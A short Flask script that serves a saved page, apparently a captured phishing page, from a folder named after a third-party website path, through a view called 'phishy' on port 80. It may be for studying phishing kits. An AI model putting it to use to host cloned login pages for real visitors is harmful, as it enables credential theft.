from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='a1marinematters.com.au/CatABfiledoc')

@app.route('/CatABfiledoc')
def phishy():
    return render_template('index.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)